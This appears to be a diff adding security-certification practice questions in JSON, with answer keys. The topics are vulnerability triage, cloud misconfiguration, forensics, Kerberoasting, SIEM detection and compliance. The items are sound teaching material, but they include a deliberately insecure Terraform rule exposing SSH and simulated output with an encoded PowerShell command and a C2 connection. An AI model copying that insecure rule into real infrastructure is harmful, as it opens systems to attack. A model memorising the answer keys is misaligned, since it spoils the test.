+      "logData": "Software Composition Analysis (SCA) Scan Results\n================================================\nProject: payment-api v2.1.0\nScan date: 2024-04-01\n\n[CRITICAL] CVE-2021-44228 — Log4j 2.14.1\n  CVSS: 10.0 | Exploitable: YES | KEV: YES | PoC: Public\n  Used by: logging-framework → payment-api\n  Fixed in: Log4j 2.17.1\n\n[HIGH] CVE-2022-22965 — Spring Framework 5.3.17\n  CVSS: 9.8 | Exploitable: YES | KEV: YES\n  Used by: web-framework → payment-api\n  Fixed in: Spring 5.3.18\n\n[MEDIUM] CVE-2023-XXXX — jackson-databind 2.13.1\n  CVSS: 6.5 | Exploitable: Theoretically | PoC: None\n  Fixed in: jackson-databind 2.13.4\n\n[INFO] 3 dependencies with no recent commits (>2 years)\n  Possible abandoned/unmaintained packages",
+      "choices": [
+        "Fix the jackson-databind medium finding first as it affects the most code",
+        "Update Log4j to 2.17.1 immediately (CVSS 10.0, CISA KEV, public exploit, active exploitation) AND deploy a WAF virtual patch rule blocking JNDI lookup strings as an interim control while testing the update",
+        "Address the abandoned dependencies first as they represent long-term supply chain risk",
+        "Update Spring Framework first as it has the same KEV status but higher urgency"
+      ],
+      "correct": 1
+    },
+    {
+      "id": "p081",
+      "ch": "3",
+      "type": "HOTSPOT",
+      "emoji": "📍",
+      "difficulty": "hard",
+      "cat": "Cloud Architecture",
+      "title": "Identify the critical IaC security misconfiguration",
+      "scenario": "A DevSecOps engineer reviews a Terraform configuration for a new web application deployment.",
+      "question": "Which Terraform resource configuration represents the MOST critical security misconfiguration?",
+      "explanation": "SSH open to 0.0.0.0/0 (internet) is the most critical misconfiguration — it exposes SSH to every IP address on the internet, enabling: (1) Brute-force attacks against SSH credentials. (2) Exploitation of SSH vulnerabilities. (3) If credentials are weak or keys are reused, immediate system compromise. This is consistently one of the top misconfigurations found in cloud environments. Fix: restrict to specific trusted IP ranges (bastion host, VPN gateway, admin office IP) or use AWS Systems Manager Session Manager (no open SSH port needed at all). Missing tags and logging are compliance/observability issues. Missing versioning is a data protection gap.",
+      "hint": "Choose the hotspot label that best answers the prompt.",
+      "diagram": "1. Security group: ingress rule allows port 22 (SSH) from 0.0.0.0/0 - resource \"aws_security_group_rule\" { type=\"ingress\" from_port=22 to_port=22 protocol=\"tcp\" cidr_blocks=[\"0.0.0.0/0\"] }\n2. EC2 instances missing required cost allocation tags - resource \"aws_instance\" { ami = \"ami-...\" instance_type = \"t3.medium\" # No tags defined }\n3. S3 bucket access logging not enabled - resource \"aws_s3_bucket\" { bucket = \"app-assets\" # No logging_config block }\n4. S3 bucket versioning not enabled - resource \"aws_s3_bucket\" { bucket = \"app-backups\" # No versioning block }",
+      "choices": [
+        "Security group: ingress rule allows port 22 (SSH) from 0.0.0.0/0",
+        "EC2 instances missing required cost allocation tags",
+        "S3 bucket access logging not enabled",
+        "S3 bucket versioning not enabled"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p082",
+      "ch": "3",
+      "type": "FILL BLANK",
+      "emoji": "✏️",
+      "difficulty": "medium",
+      "cat": "Network Architecture",
+      "title": "Complete the VPN and tunnelling protocol descriptions",
+      "scenario": "",
+      "question": "Fill in the correct VPN protocol or concept for each description.",
+      "explanation": "OpenVPN: mature, widely deployed, TLS-based, very configurable. Port 443 TCP makes it appear as HTTPS — hard to block. WireGuard: modern protocol — ~4,000 lines of code vs ~100,000 for OpenVPN/IPSec. Smaller attack surface, faster handshake, better performance. Now included in Linux kernel. Split-tunnel: corporate traffic through VPN, internet traffic direct — reduces VPN bandwidth requirements and latency for non-corporate traffic. Risk: internet-connected device could be used as a pivot to corporate network if compromised. Full tunnel routes ALL traffic through corporate (more control, higher bandwidth).",
+      "hint": "Fill each blank with the most accurate security term.",
+      "blanks": [
+        {
+          "id": "b0",
+          "sentence": "___ is an open-source VPN protocol that uses TLS for the control channel and can operate on any port (commonly UDP 1194 or TCP 443), making it very firewall-friendly.",
+          "answer": "OpenVPN",
+          "hint": "IPSec, OpenVPN, WireGuard, L2TP"
+        },
+        {
+          "id": "b1",
+          "sentence": "___ is a modern, high-performance VPN protocol using state-of-the-art cryptography (ChaCha20, Poly1305, Curve25519) with a minimal codebase of approximately 4,000 lines — far simpler and faster than OpenVPN or IPSec.",
+          "answer": "WireGuard",
+          "hint": "OpenVPN, IKEv2, WireGuard, SSTP"
+        },
+        {
+          "id": "b2",
+          "sentence": "In a ___ VPN configuration, only traffic destined for the corporate network is routed through the VPN tunnel — other internet traffic goes directly through the user's local internet connection.",
+          "answer": "split-tunnel",
+          "hint": "full-tunnel, split-tunnel, hub-and-spoke, site-to-site"
+        }
+      ]
+    },
+    {
+      "id": "p083",
+      "ch": "4",
+      "type": "DRAG & DROP",
+      "emoji": "🔀",
+      "difficulty": "easy",
+      "cat": "Security Monitoring",
+      "title": "Match log source to the security investigation question it answers",
+      "scenario": "",
+      "question": "Match each log source to the security investigation question it BEST answers.",
+      "explanation": "Each log source answers different forensic questions: Windows Security logs: authentication and process execution timeline. DNS logs: C2 beacon detection, DGA (Domain Generation Algorithm) patterns, DNS tunnelling. Proxy logs: user browsing behaviour, web-based malware delivery, data exfiltration via web upload. Cloud audit logs: API-level activity in cloud environments (who created/deleted/modified what resource). EDR telemetry: endpoint behaviour — file modifications, memory operations, process trees, network connections from specific processes. Comprehensive incident response uses ALL of these in correlation.",
+      "hint": "Drag each item to the target it best matches.",
+      "items": [
+        {
+          "id": "i0",
+          "label": "Windows Security Event Log (4624, 4688)"
+        },
+        {
+          "id": "i1",
+          "label": "DNS query logs"
+        },
+        {
+          "id": "i2",
+          "label": "Proxy/web gateway logs"
+        },
+        {
+          "id": "i3",
+          "label": "Cloud provider audit logs (CloudTrail/Azure Monitor)"
+        },
+        {
+          "id": "i4",
+          "label": "EDR behavioural telemetry"
+        }
+      ],
+      "targets": [
+        {
+          "id": "t0",
+          "label": "Who authenticated to what system, and what processes did they launch?"
+        },
+        {
+          "id": "t1",
+          "label": "What domains is this host resolving — any DGA patterns or known C2 domains?"
+        },
+        {
+          "id": "t2",
+          "label": "What URLs and external resources did this user access from their browser?"
+        },
+        {
+          "id": "t3",
+          "label": "What API calls were made in the cloud environment and by which identity?"
+        },
+        {
+          "id": "t4",
+          "label": "What processes spawned children, injected memory, or modified files on this endpoint?"
+        }
+      ],
+      "correctMapping": {
+        "i0": "t0",
+        "i1": "t1",
+        "i2": "t2",
+        "i3": "t3",
+        "i4": "t4"
+      }
+    },
+    {
+      "id": "p084",
+      "ch": "4",
+      "type": "TERMINAL SIM",
+      "emoji": "💻",
+      "difficulty": "medium",
+      "cat": "Incident Response",
+      "title": "Collect volatile forensic evidence using PowerShell",
+      "scenario": "An IR analyst responds to a live Windows system suspected of compromise. Before network isolation, they must capture volatile data. The output will be saved to D:\\ (forensic USB).",
+      "question": "Select the PowerShell command that correctly captures running processes WITH their full command lines and network connections simultaneously.",
+      "explanation": "Get-Process -IncludeUserName and selecting CommandLine captures what programs are running and exactly how they were launched — malicious PowerShell is often identified by encoded command-line flags. Get-NetTCPConnection captures active network connections with PIDs — correlate with process list to identify which process is beaconing to C2. Order of volatile capture: processes → network connections → memory (winpmem, RAMMap) → then isolate. Shutting down first destroys everything in RAM including potential encryption keys and attacker tools.",
+      "hint": "Select the command that produces the secure result requested by the prompt.",
+      "answer": "PS C:\\> # LIVE FORENSICS — capture before isolation\n# Time: 2024-04-01T03:22:07Z\n# Target: WORKSTATION-14\n# Goal: Capture volatile data to D:\\forensics\\\n\nPS C:\\> Get-Process | Select-Object Name,Id,Path,CommandLine | Export-Csv D:\\forensics\\processes.csv -NoTypeInformation\n[CAPTURED] 247 processes — including:\n  svchost.exe (PID 3801) Path: C:\\Users\\Public\\svchost.exe  ← SUSPICIOUS\n  powershell.exe (PID 4900) CommandLine: -enc SQBFAFgA...  ← ENCODED\n\nPS C:\\> Get-NetTCPConnection | Export-Csv D:\\forensics\\connections.csv -NoTypeInformation\n[CAPTURED] 89 TCP connections — including:\n  PID 3801 → 185.220.101.45:443 ESTABLISHED  ← C2\n\n[NEXT] Capture RAM: winpmem.exe D:\\forensics\\memory.raw\n[THEN] Network isolate via EDR console",
+      "choices": [
+        "Get-Process | Select-Object Name,Id,Path,CommandLine | Export-Csv D:\\forensics\\processes.csv -NoTypeInformation; Get-NetTCPConnection | Export-Csv D:\\forensics\\connections.csv -NoTypeInformation",
+        "Get-ChildItem C:\\Windows\\System32 | Export-Csv D:\\system32.csv",
+        "Stop-Computer -Force",
+        "Compress-Archive -Path C:\\ -DestinationPath D:\\full_backup.zip"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p085",
+      "ch": "4",
+      "type": "DRAG & DROP",
+      "emoji": "🔀",
+      "difficulty": "hard",
+      "cat": "Digital Forensics",
+      "title": "Match forensic artefact locations to the evidence they contain",
+      "scenario": "",
+      "question": "Match each Windows forensic artefact location to the evidence it contains.",
+      "explanation": "Recent folder: LNK files reveal what files/folders were accessed — useful for insider threat investigations (did they access salary data?). Run key: persistence — malware frequently adds itself here. Prefetch: C:\\Windows\\Prefetch\\MALWARE.EXE-XXXXXXXX.pf proves the executable ran even if the file is deleted — includes run count and timestamps. USBSTOR: every USB drive that ever connected — serial number can be matched to purchase records. Recycle Bin: $I files contain original path and deletion time; $R files contain the actual content (unless emptied).",
+      "hint": "Drag each item to the target it best matches.",
+      "items": [
+        {
+          "id": "i0",
+          "label": "%AppData%\\Microsoft\\Windows\\Recent\\"
+        },
+        {
+          "id": "i1",
+          "label": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        },
+        {
+          "id": "i2",
+          "label": "C:\\Windows\\Prefetch\\"
+        },
+        {
+          "id": "i3",
+          "label": "HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR"
+        },
+        {
+          "id": "i4",
+          "label": "$Recycle.Bin\\"
+        }
+      ],
+      "targets": [
+        {
+          "id": "t0",
+          "label": "Recently accessed files and folders — shows what the user opened (LNK shortcut files with timestamps)"
+        },
+        {
+          "id": "t1",
+          "label": "Programs configured to run at user logon — common malware persistence location"
+        },
+        {
+          "id": "t2",
+          "label": "Evidence of program execution — each .pf file proves a specific executable ran, even if later deleted"
+        },
+        {
+          "id": "t3",
+          "label": "USB storage devices that have been connected — vendor, product, serial number, and connection history"
+        },
+        {
+          "id": "t4",
+          "label": "Deleted files — contains the original file name and deletion timestamp ($I files)"
+        }
+      ],
+      "correctMapping": {
+        "i0": "t0",
+        "i1": "t1",
+        "i2": "t2",
+        "i3": "t3",
+        "i4": "t4"
+      }
+    },
+    {
+      "id": "p086",
+      "ch": "4",
+      "type": "ORDERING",
+      "emoji": "📋",
+      "difficulty": "medium",
+      "cat": "Vulnerability Management",
+      "title": "Order the steps for emergency patch response to a critical CVE",
+      "scenario": "",
+      "question": "A CISA KEV-listed RCE vulnerability is published for software running on your internet-facing servers. Order the response steps CORRECTLY.",
+      "explanation": "Emergency patch response: (1) Identify all affected systems — scope first. (2) Implement compensating controls immediately — WAF virtual patch stops exploitation while you prepare the real fix (critical for KEV-listed CVEs which are being actively exploited). (3) Test the patch — even emergency patches can break things; staging test prevents production outage. (4) Communicate and plan maintenance window — stakeholders need warning. (5) Deploy to production — after validation and communication. The compensating control in step 2 is what makes this process safe — it stops exploitation while steps 3-4 proceed.",
+      "hint": "Place the steps in the most secure operational order.",
+      "items": [
+        {
+          "id": "o0",
+          "label": "Deploy the patch to production after validation"
+        },
+        {
+          "id": "o1",
+          "label": "Identify all systems running the affected software version using asset inventory and CMDB"
+        },
+        {
+          "id": "o2",
+          "label": "Test the patch in a development/staging environment for compatibility and regression issues"
+        },
+        {
+          "id": "o3",
+          "label": "Implement compensating controls immediately (WAF virtual patch, network restriction, disable feature)"
+        },
+        {
+          "id": "o4",
+          "label": "Assess business impact of patching and communicate planned maintenance window to stakeholders"
+        }
+      ],
+      "correctOrder": [
+        "o1",
+        "o3",
+        "o2",
+        "o4",
+        "o0"
+      ]
+    },
+    {
+      "id": "p087",
+      "ch": "4",
+      "type": "HOTSPOT",
+      "emoji": "📍",
+      "difficulty": "medium",
+      "cat": "Identity Management",
+      "title": "Identify the Kerberoasting vulnerability",
+      "scenario": "A threat hunter runs BloodHound analysis on an Active Directory environment and finds the following service account configuration.",
+      "question": "Which service account configuration is MOST vulnerable to a Kerberoasting attack?",
+      "explanation": "Kerberoasting exploits service accounts with registered SPNs: any domain user can request a Kerberos service ticket (TGS) for any SPN. The TGS is encrypted with the service account's password hash — the attacker takes it offline for cracking. svc_database is the perfect Kerberoasting target: (1) Has an SPN (required). (2) Is a Domain Admin (maximum impact if cracked). (3) 90-day-old 12-character password (feasible to crack offline). Mitigations: use gMSA (240-char uncrackable password) like svc_webpool, or use AES-256 Kerberos encryption, or use managed service accounts with very long random passwords.",
+      "hint": "Choose the hotspot label that best answers the prompt.",
+      "diagram": "1. svc_database: SPN registered, Domain Admin member, password: 90 days old - ServicePrincipalName: MSSQLSvc/db-server.corp.com:1433. Member of Domain Admins group. Password complexity: 12 chars. Last changed: 90 days ago. Kerberos TGS tickets can be requested by any domain user.\n2. svc_webpool: Group Managed Service Account (gMSA) - Managed by Active Directory. Password is 240-character random value rotated automatically every 30 days by AD. No SPN attack surface because the password is uncrackable.\n3. svc_monitoring: SPN registered, member of Monitoring_ReadOnly group only - Limited permissions — read-only monitoring access. Password: 16 chars, changed last week.\n4. svc_backup: no SPN, uses certificate-based authentication - No Kerberos SPN registered. Certificate-based auth means no password hash to steal. No Kerberoasting attack surface.",
+      "choices": [
+        "svc_database: SPN registered, Domain Admin member, password: 90 days old",
+        "svc_webpool: Group Managed Service Account (gMSA)",
+        "svc_monitoring: SPN registered, member of Monitoring_ReadOnly group only",
+        "svc_backup: no SPN, uses certificate-based authentication"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p088",
+      "ch": "4",
+      "type": "FILL BLANK",
+      "emoji": "✏️",
+      "difficulty": "easy",
+      "cat": "Incident Response",
+      "title": "Complete the business continuity and disaster recovery terminology",
+      "scenario": "",
+      "question": "Fill in the correct BCP/DR term for each description.",
+      "explanation": "RPO (Recovery Point Objective): data loss tolerance — if RPO is 1 hour, backups must run at least hourly. Hot site: fully operational with real-time data replication — failover in minutes. Warm site: hardware ready, data partially current — hours to recover. Cold site: facility only, no equipment — days/weeks. Tabletop exercise: cheapest, most common — identifies gaps in plans without operational disruption. Other exercise types: walkthrough (review plans), simulation (functional test of some systems), full-scale exercise (complete test with all teams and systems activated). Regular exercises are required by frameworks like ISO 22301 and NIST SP 800-34.",
+      "hint": "Fill each blank with the most accurate security term.",
+      "blanks": [
+        {
+          "id": "b0",
+          "sentence": "The ___ defines the maximum acceptable data loss measured in time — it determines the minimum backup frequency required.",
+          "answer": "RPO",
+          "hint": "RTO, RPO, MTD, MTTR"
+        },
+        {
+          "id": "b1",
+          "sentence": "A ___ site has pre-installed, pre-configured hardware and software with current data replicated continuously — the fastest failover option, measured in minutes, but most expensive.",
+          "answer": "hot site",
+          "hint": "warm site, cold site, hot site, cloud site"
+        },
+        {
+          "id": "b2",
+          "sentence": "A ___ exercise is a discussion-based simulation where the IR team talks through their response to a hypothetical scenario — no actual systems are involved.",
+          "answer": "tabletop",
+          "hint": "simulation, tabletop, functional, full-scale"
+        }
+      ]
+    },
+    {
+      "id": "p089",
+      "ch": "4",
+      "type": "TERMINAL SIM",
+      "emoji": "💻",
+      "difficulty": "hard",
+      "cat": "Security Monitoring",
+      "title": "Write a Splunk SPL query to detect brute force attempts",
+      "scenario": "A SOC analyst needs to write a Splunk query to detect brute force attacks: more than 5 failed logins from a single source IP within 5 minutes.",
+      "question": "Select the correct Splunk SPL query to detect this pattern.",
+      "explanation": "Key Splunk SPL components: index=windows_security EventCode=4625: search in the correct index for the specific Windows event (failed auth). bucket _time span=5m: groups events into 5-minute time windows. stats count by src_ip, _time: counts events per source IP within each time bucket. where count > 5: applies the threshold filter. This pattern — bucket → stats → where — is the standard SPL approach for threshold-based detection. For production: add | eval threshold=5 and consider whitelisting known vulnerability scanner IPs to reduce false positives.",
+      "hint": "Select the command that produces the secure result requested by the prompt.",
+      "answer": "index=windows_security EventCode=4625\n# 4625 = Failed Authentication on Windows\n# Fields available: src_ip, user, EventCode, _time\n# Goal: Alert when single IP has >5 failures in 5 minutes\n\n[SPL QUERY RUNNING]\nindex=windows_security EventCode=4625\n| bucket _time span=5m\n| stats count by src_ip, _time\n| where count > 5\n\n[RESULTS]\nsrc_ip           _time                count\n198.51.100.4    2024-04-01 02:14:00  47  ← ALERT\n203.0.113.88    2024-04-01 02:15:00  23  ← ALERT\n10.0.0.55       2024-04-01 03:00:00   3  (below threshold)\n\n[ENHANCEMENT] Add | sort -count | rename src_ip AS \"Attacking IP\"",
+      "choices": [
+        "index=windows_security EventCode=4625 | bucket _time span=5m | stats count by src_ip, _time | where count > 5",
+        "index=windows_security | search EventCode=4625 | head 100",
+        "index=windows_security EventCode=4624 | stats count by src_ip",
+        "index=windows_security EventCode=4625 | table src_ip, user, _time"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p090",
+      "ch": "4",
+      "type": "ORDERING",
+      "emoji": "📋",
+      "difficulty": "medium",
+      "cat": "Digital Forensics",
+      "title": "Order the digital forensic investigation steps for a seized device",
+      "scenario": "",
+      "question": "A forensic investigator receives a seized laptop from law enforcement. Order the correct forensic processing steps.",
+      "explanation": "Forensic processing order: (1) Document receipt — photograph, record serial number, begin chain of custody. (2) Write-blocked imaging — hardware write blocker prevents any modification to the original; create forensic image. (3) Hash the image — MD5 + SHA-256 recorded in CoC proves integrity. (4) Analyse the IMAGE only — never work on the original evidence. (5) Report — document methodology, tools, findings, and conclusions. Never skip the write blocker — even reading a drive can modify last-accessed timestamps on some file systems. Never work on original evidence — analysis creates artefacts that contaminate the evidence.",
+      "hint": "Place the steps in the most secure operational order.",
+      "items": [
+        {
+          "id": "o0",
+          "label": "Document findings in a detailed forensic report suitable for court submission"
+        },
+        {
+          "id": "o1",
+          "label": "Hash the forensic image (MD5 + SHA-256) and record in chain of custody documentation"
+        },
+        {
+          "id": "o2",
+          "label": "Connect the device via a hardware write blocker and create a forensic bit-for-bit image"
+        },
+        {
+          "id": "o3",
+          "label": "Analyse the forensic image on a separate forensic workstation — never the original"
+        },
+        {
+          "id": "o4",
+          "label": "Photograph the device, document serial number, and record receipt in chain of custody"
+        }
+      ],
+      "correctOrder": [
+        "o4",
+        "o2",
+        "o1",
+        "o3",
+        "o0"
+      ]
+    },
+    {
+      "id": "p091",
+      "ch": "4",
+      "type": "LOG ANALYSIS",
+      "emoji": "📊",
+      "difficulty": "hard",
+      "cat": "Identity Management",
+      "title": "Analyse a PAM audit log for credential abuse",
+      "scenario": "",
+      "question": "Which log entries provide the STRONGEST evidence of credential misuse during admin-sarah's session?",
+      "explanation": "PAM provides visibility into privileged session activity. The red flags in admin-sarah's session: (1) 4 database servers accessed — stated scope was one server. (2) Full table queries with no LIMIT — \"performance review\" does not require reading all customer payment and PII records. (3) 12.4GB export to /tmp — exporting a full payment table to a temp directory is data exfiltration staging, not performance analysis. This is a case for PAM session recording review, immediate credential revocation, and insider threat investigation. Read-only SQL can absolutely cause harm through data exfiltration.",
+      "hint": "Look for the event, timestamp, source, and outcome that prove the finding.",
+      "logData": "PAM System Audit Log — 2024-04-01\n==================================\n08:14:22 admin-john  Checked out: svc_oracle_prod  Duration: 4h  Reason: scheduled maintenance\n08:14:24 svc_oracle_prod  Login to: DB-PROD-01\n08:18:55 svc_oracle_prod  SQL: SELECT * FROM customer_payments LIMIT 10  [OK]\n...\n08:45:00 admin-john  Checked in: svc_oracle_prod  Session ended\n\n11:32:17 admin-sarah  Checked out: svc_oracle_prod  Duration: 2h  Reason: query performance review\n11:32:19 svc_oracle_prod  Login to: DB-PROD-01\n11:32:21 svc_oracle_prod  Login to: DB-PROD-02\n11:32:23 svc_oracle_prod  Login to: DB-PROD-03\n11:32:25 svc_oracle_prod  Login to: DB-PROD-04\n11:33:01 svc_oracle_prod  SQL: SELECT * FROM customer_payments  [No LIMIT — full table]\n11:33:48 svc_oracle_prod  SQL: SELECT * FROM customer_pii  [No LIMIT]\n11:34:12 svc_oracle_prod  EXPORT: customer_payments → /tmp/export.csv  12.4GB\n11:34:55 admin-sarah  UNUSUAL: Credential held beyond scope (accessed 4 systems vs 1 expected)",
+      "choices": [
+        "admin-sarah checked out the credential with a legitimate reason — this is normal PAM behaviour",
+        "Logging into 4 database servers (02, 03, 04 were not in the stated scope), querying two full PII tables with no LIMIT clause, and exporting 12.4GB of customer data to /tmp — vastly exceeds stated scope of \"query performance review\"",
+        "The session lasted less than 2 hours so it is within approved parameters",
+        "The SQL queries were SELECT statements — read-only access cannot cause harm"
+      ],
+      "correct": 1
+    },
+    {
+      "id": "p092",
+      "ch": "4",
+      "type": "HOTSPOT",
+      "emoji": "📍",
+      "difficulty": "easy",
+      "cat": "Vulnerability Management",
+      "title": "Identify the correct vulnerability scan type for each scenario",
+      "scenario": "A security team plans four different vulnerability scanning activities. Identify which scan type is INCORRECTLY matched to its scenario.",
+      "question": "Which scan type is INCORRECTLY matched to its scenario?",
+      "explanation": "PCI DSS Requirement 11.3 requires credentialed internal scans — not unauthenticated scans. An unauthenticated internal scan misses the majority of vulnerabilities because it cannot authenticate to systems to check patch levels, installed software versions, and configuration settings. PCI DSS also requires that internal scans be performed by qualified internal resources or qualified third parties, and that critical/high vulnerabilities be remediated before a scan can be considered passing. Additionally, PCI DSS requires external scans by an Approved Scanning Vendor (ASV) — a separate requirement from internal scans.",
+      "hint": "Choose the hotspot label that best answers the prompt.",
+      "diagram": "1. External attack surface scan → Unauthenticated scan from outside the network - Correct — unauthenticated external scanning simulates an attacker's perspective, showing only what is exposed from the internet without credentials.\n2. Internal compliance check → Credentialed scan with domain admin credentials - Correct — credentialed scans authenticate to systems and enumerate installed software, patches, and configuration from the inside for accurate compliance checking.\n3. Annual PCI DSS scan → Internal unauthenticated scan run by internal IT team - The team says this satisfies PCI DSS Requirement 11.3 for internal vulnerability scanning.\n4. Web application testing → DAST tool scanning the running application - Correct — DAST tools probe the running web application from the outside, testing input validation, authentication, and application logic.",
+      "choices": [
+        "External attack surface scan → Unauthenticated scan from outside the network",
+        "Internal compliance check → Credentialed scan with domain admin credentials",
+        "Annual PCI DSS scan → Internal unauthenticated scan run by internal IT team",
+        "Web application testing → DAST tool scanning the running application"
+      ],
+      "correct": 2
+    },
+    {
+      "id": "p093",
+      "ch": "4",
+      "type": "DRAG & DROP",
+      "emoji": "🔀",
+      "difficulty": "hard",
+      "cat": "Incident Response",
+      "title": "Match incident types to their containment strategies",
+      "scenario": "",
+      "question": "Match each incident type to the MOST appropriate immediate containment strategy.",
+      "explanation": "Containment is always tailored to the incident type: Ransomware: speed is critical — every connected system risks encryption. Network isolation stops spread. Phishing: email-layer containment removes the lure from all inboxes simultaneously. Insider/data theft: contain the exfil channel (block destinations) + contain the actor (disable account). Preserve evidence before account wipe. DDoS: upstream mitigation is the only effective response — the attack volume exceeds what you can handle locally. Compromised privileged account: disable immediately to stop all further abuse — then investigate scope before re-enabling.",
+      "hint": "Drag each item to the target it best matches.",
+      "items": [
+        {
+          "id": "i0",
+          "label": "Active ransomware spreading across the network"
+        },
+        {
+          "id": "i1",
+          "label": "Phishing campaign targeting employees with credential theft links"
+        },
+        {
+          "id": "i2",
+          "label": "Insider threat exfiltrating data via personal cloud storage"
+        },
+        {
+          "id": "i3",
+          "label": "DDoS attack saturating internet uplink"
+        },
+        {
+          "id": "i4",
+          "label": "Compromised service account with domain admin privileges"
+        }
+      ],
+      "targets": [
+        {
+          "id": "t0",
+          "label": "Network isolate all infected systems immediately via EDR; disable affected shares and network paths"
+        },
+        {
+          "id": "t1",
+          "label": "Block malicious URLs at email gateway; quarantine emails containing the links from all mailboxes"
+        },
+        {
+          "id": "t2",
+          "label": "Block personal cloud storage domains at the proxy/firewall; disable the user's account pending investigation"
+        },
+        {
+          "id": "t3",
+          "label": "Contact ISP/upstream provider for BGP blackholing; engage DDoS mitigation service; activate rate limiting"
+        },
+        {
+          "id": "t4",
+          "label": "Immediately disable the service account in Active Directory; reset the password; review all activity in audit logs"
+        }
+      ],
+      "correctMapping": {
+        "i0": "t0",
+        "i1": "t1",
+        "i2": "t2",
+        "i3": "t3",
+        "i4": "t4"
+      }
+    },
+    {
+      "id": "p094",
+      "ch": "4",
+      "type": "CONFIG/ACL",
+      "emoji": "⚙️",
+      "difficulty": "medium",
+      "cat": "Security Monitoring",
+      "title": "Evaluate SIEM alert tuning decisions",
+      "scenario": "A SOC analyst tunes a SIEM to reduce false positives on an alert: \"Multiple failed logins followed by success (possible credential attack)\".",
+      "question": "Exclude authorised vulnerability scanner — reduces FP?",
+      "explanation": "Good tuning: actions 1, 2, 4 reduce false positives while maintaining detection. Excluding documented authorised activity (scanners, service accounts) and adding context (time of day) narrows the alert to genuinely suspicious activity. Bad tuning: Action 3 (threshold 1000) — most real brute force attacks succeed in fewer than 100 attempts; raising to 1000 creates a massive blind spot. Action 5 (disable rule) — eliminates all detection of a real attack technique; never the right answer. The correct approach is to understand WHY the false positives occur and address that root cause.",
+      "hint": "Compare the existing rule set with least privilege and the requested business outcome.",
+      "currentConfig": "Tuning Action | Approach | Expected Effect | Good Tuning?\n1. Exclude known scanner IPs | Whitelist Nessus scanner (10.0.0.5) from triggering the alert | FP reduction | ?\n2. Exclude service accounts | Whitelist svc_* accounts that legitimately retry frequently | FP reduction | ?\n3. Raise threshold to 1000 | Only alert after 1000 failed logins before success | FP reduction | ?\n4. Add business hours context | Weight alerts more heavily for off-hours (23:00-06:00) failures | FP reduction | ?\n5. Disable the rule entirely | Remove the alert because it generates too many FPs | FP reduction | ?",
+      "choices": [
+        "GOOD",
+        "BAD"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p095",
+      "ch": "5",
+      "type": "DRAG & DROP",
+      "emoji": "🔀",
+      "difficulty": "easy",
+      "cat": "Governance & Compliance",
+      "title": "Match compliance frameworks to their primary data type or industry",
+      "scenario": "",
+      "question": "Match each compliance framework or regulation to the data type or industry it PRIMARILY governs.",
+      "explanation": "Knowing which framework applies: HIPAA: US healthcare. PCI DSS: payment card — applies globally to any merchant or service provider handling card data. GDPR: EU personal data — applies to organisations worldwide if they process EU residents' data (extraterritorial reach). SOX: US public companies — Section 404 requires management and auditor attestation of internal controls (IT controls heavily scrutinised). FERPA: US students. Multiple frameworks often apply simultaneously — a US hospital accepting credit card payments from EU patients must comply with HIPAA + PCI DSS + GDPR.",
+      "hint": "Drag each item to the target it best matches.",
+      "items": [
+        {
+          "id": "i0",
+          "label": "HIPAA (US)"
+        },
+        {
+          "id": "i1",
+          "label": "PCI DSS"
+        },
+        {
+          "id": "i2",
+          "label": "GDPR (EU)"
+        },
+        {
+          "id": "i3",
+          "label": "SOX (US)"
+        },
+        {
+          "id": "i4",
+          "label": "FERPA (US)"
+        }
+      ],
+      "targets": [
+        {
+          "id": "t0",
+          "label": "Protected Health Information (PHI) — medical records, diagnoses, treatment data for US healthcare"
+        },
+        {
+          "id": "t1",
+          "label": "Payment card data — credit/debit card numbers and transaction data, any industry that stores/processes/transmits CHD"
+        },
+        {
+          "id": "t2",
+          "label": "Personal data of EU/EEA residents — any industry, any location if processing EU resident data"
+        },
+        {
+          "id": "t3",
+          "label": "Financial reporting controls for US publicly traded companies — IT controls over financial systems"
+        },
+        {
+          "id": "t4",
+          "label": "Student educational records — US educational institutions receiving federal funding"
+        }
+      ],
+      "correctMapping": {
+        "i0": "t0",
+        "i1": "t1",
+        "i2": "t2",
+        "i3": "t3",
+        "i4": "t4"
+      }
+    },
+    {
+      "id": "p096",
+      "ch": "5",
+      "type": "ORDERING",
+      "emoji": "📋",
+      "difficulty": "medium",
+      "cat": "Risk Management",
+      "title": "Order the risk management process correctly",
+      "scenario": "",
+      "question": "Order the risk management lifecycle steps from FIRST to LAST.",
+      "explanation": "Risk management lifecycle (NIST SP 800-39 / ISO 27005): (1) Identify risks — what assets, what threats, what vulnerabilities. (2) Analyse risk level — likelihood × impact = risk rating. (3) Select treatment — mitigate, accept, transfer, avoid based on risk tolerance. (4) Implement controls — deploy the chosen treatment. (5) Monitor continuously — risks change, controls degrade, new threats emerge. The cycle repeats. This is not a one-time project — effective risk management is continuous.",
+      "hint": "Place the steps in the most secure operational order.",
+      "items": [
+        {
+          "id": "o0",
+          "label": "Continuously monitor risks, control effectiveness, and changes in the threat landscape"
+        },
+        {
+          "id": "o1",
+          "label": "Implement selected controls to treat identified risks"
+        },
+        {
+          "id": "o2",
+          "label": "Identify assets, threats to those assets, and existing vulnerabilities"
+        },
+        {
+          "id": "o3",
+          "label": "Select the appropriate risk treatment strategy (mitigate, accept, transfer, avoid)"
+        },
+        {
+          "id": "o4",
+          "label": "Analyse and quantify the level of risk using likelihood × impact or qualitative rating"
+        }
+      ],
+      "correctOrder": [
+        "o2",
+        "o4",
+        "o3",
+        "o1",
+        "o0"
+      ]
+    },
+    {
+      "id": "p097",
+      "ch": "5",
+      "type": "HOTSPOT",
+      "emoji": "📍",
+      "difficulty": "hard",
+      "cat": "Frameworks",
+      "title": "Select the correct security framework for a specific use case",
+      "scenario": "An organisation in each scenario needs to select a security framework. Identify the MISMATCHED recommendation.",
+      "question": "Which framework recommendation is INCORRECTLY matched to the organisation's needs?",
+      "explanation": "ISO 27001 is NOT the correct primary framework for OT/ICS/SCADA environments. ISO 27001 was designed for information technology — it assumes IT concepts (confidentiality, integrity, availability in that order) that don't map well to operational technology where safety and availability are the primary concerns. The correct frameworks for industrial environments: IEC 62443 (primary OT/ICS security standard), NIST SP 800-82 (Guide to ICS Security), and NERC CIP (for electric grid). ISO 27001 can complement these but should not be the primary OT security framework.",
